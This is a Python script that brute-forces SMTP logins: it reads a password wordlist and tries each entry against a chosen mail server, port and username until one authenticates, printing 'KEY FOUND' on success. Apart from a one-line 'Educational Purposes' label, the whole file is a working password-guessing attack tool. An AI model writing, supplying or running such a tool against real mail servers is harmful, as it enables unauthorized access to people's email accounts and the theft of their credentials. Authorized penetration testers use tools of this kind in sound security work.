import smtplib
import argparse

def smtp_bruteforce(target, port, username, password_list):
    for password in password_list:
        try:
            # Attempt to connect to the SMTP server
            server = smtplib.SMTP(target, port)
            server.set_debuglevel(0)
            server.ehlo()  # Start the connection
            server.login(username, password)  # Try logging in

            print(f"KEY FOUND [{password}]")
            server.quit()
            break

        except smtplib.SMTPAuthenticationError:
            # Incorrect password, move to next in the list
            print(f"Trying password: {password} - Failed")
            continue
        except Exception as e:
            print(f"An error occurred: {e}")
            break

    else:
        print("KEY NOT FOUND")

def main():
    # Set up argument parsing using argparse
    parser = argparse.ArgumentParser(description="SMTP Brute Force for Educational Purposes")
    
    # Define command-line arguments
    parser.add_argument('-l', '--username', type=str, required=True, help='Username (email address) for SMTP login')
    parser.add_argument('-P', '--passwordlist', type=str, required=True, help='Path to the password list file')
    parser.add_argument('smtp_server', type=str, help='Target SMTP server (e.g., smtp.example.com)')
    parser.add_argument('port', type=int, help='SMTP server port (e.g., 587)')

    # Parse the command-line arguments
    args = parser.parse_args()

    # Read the password list from the file
    try:
        with open(args.passwordlist, 'r') as f:
            password_list = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Error: The file {args.passwordlist} does not exist.")
        return

    # Run the brute force attack
    smtp_bruteforce(args.smtp_server, args.port, args.username, password_list)

if __name__ == "__main__":
    main()
